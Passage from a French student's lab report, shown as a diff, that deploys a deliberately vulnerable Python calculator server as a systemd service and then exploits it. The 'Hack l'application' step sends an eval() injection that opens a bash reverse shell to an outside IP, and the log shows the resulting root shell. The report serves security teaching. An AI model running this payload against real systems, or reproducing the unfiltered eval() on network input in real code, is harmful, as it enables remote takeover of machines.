@@ -965,3 +965,141 @@ accept4 access arch_prctl bind brk clone close connect dup2 epoll_create epoll_c
 
 🌞 HARDEN
 
+Le fichier de conf de nginx avec le principe du moindre privilège: [nginx.service](nginx.service)
+
+# Part IV : My shitty app
+
+🌞 Téléchargez l'app Python dans votre VM
+
+```
+[fmaxance@vbox ~]$ cd /opt
+[fmaxance@vbox opt]$ sudo curl https://gitlab.com/it4lik/b3y-csec-2024/-/raw/main/tp/2/calc.py -o calc.py
+[sudo] password for fmaxance:
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   659  100   659    0     0   1279      0 --:--:-- --:--:-- --:--:--  1279
+[fmaxance@vbox opt]$ ls
+calc.py
+[fmaxance@vbox opt]$ cat calc.py
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind(('0.0.0.0', 13337))
+
+s.listen(1)
+conn, addr = s.accept()
+
+while True:
+
+    try:
+        # Send un ptit hello
+        conn.send("Hello".encode())
+
+        # On attend de recevoir un calcul du client
+        data = conn.recv(1024)
+        data = data.decode().strip("\n")
+
+        # Evaluation et envoi du résultat
+        res = eval(data)
+        conn.send(str(res).encode())
+        print("Réponse envoyée au client.")
+
+    except socket.error:
+        print("Une erreur est survenue, déso.")
+        break
+
+conn.close()
+```
+
+🌞 Lancer l'application dans votre VM
+
+```
+[fmaxance@vbox opt]$ python3 /opt/calc.py
+
+```
+
+```
+[fmaxance@vbox opt]$ sudo firewall-cmd --add-port=13337/tcp --permanent
+[sudo] password for fmaxance:
+success
+[fmaxance@vbox opt]$
+```
+
+```
+fmaxance@MSI:~$ nc 10.1.1.12 13337
+Hello3+3
+6Hello
+```
+
+🌞 Créer un service calculatrice.service
+
+```
+[fmaxance@vbox opt]$ sudo cat /etc/systemd/system/calculatrice.service
+[Unit]
+Description=Super serveur calculatrice
+
+[Service]
+ExecStart=/usr/bin/python3 /opt/calc.py
+Restart=always
+```
+
+🌞 Indiquer à systemd que vous avez modifié les services
+
+```
+[fmaxance@vbox opt]$ sudo systemctl daemon-reload
+```
+
+🌞 Vérifier que ce nouveau service est bien reconnu*
+
+```
+[fmaxance@vbox opt]$ systemctl status calculatrice
+○ calculatrice.service - Super serveur calculatrice
+     Loaded: loaded (/etc/systemd/system/calculatrice.service; static)
+     Active: inactive (dead)
+```
+
+🌞 Vous devez pouvoir utiliser l'application normalement :
+
+```
+[fmaxance@vbox opt]$ sudo systemctl start calculatrice
+[fmaxance@vbox opt]$ sudo systemctl status calculatrice
+● calculatrice.service - Super serveur calculatrice
+     Loaded: loaded (/etc/systemd/system/calculatrice.service; static)
+     Active: active (running) since Wed 2025-03-19 15:56:18 CET; 3s ago
+   Main PID: 1863 (python3)
+      Tasks: 1 (limit: 23155)
+     Memory: 3.3M
+        CPU: 14ms
+     CGroup: /system.slice/calculatrice.service
+             └─1863 /usr/bin/python3 /opt/calc.py
+
+Mar 19 15:56:18 vbox systemd[1]: Started Super serveur calculatrice.
+[fmaxance@vbox opt]$
+```
+
+```
+fmaxance@MSI:~$ nc 10.1.1.12 13337
+Hello10+10
+20Hello
+```
+
+🌞 Hack l'application
+
+```
+fmaxance@MSI:~$ echo "__import__('os').system('bash -i >& /dev/tcp/172.27.206.51/4444 0>&1')" | nc 10.1.1.12 13337
+Hello
+```
+
+```
+fmaxance@MSI:~$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 172.27.192.1 59002
+bash: cannot set terminal process group (1902): Inappropriate ioctl for device
+bash: no job control in this shell
+[root@vbox /]# id
+id
+uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0
+```
+
+La fonction vulnérable est donc ``eval()`` car il n'y a aucun filtre, l'utilisateur peut injecter n'importe quel payload.
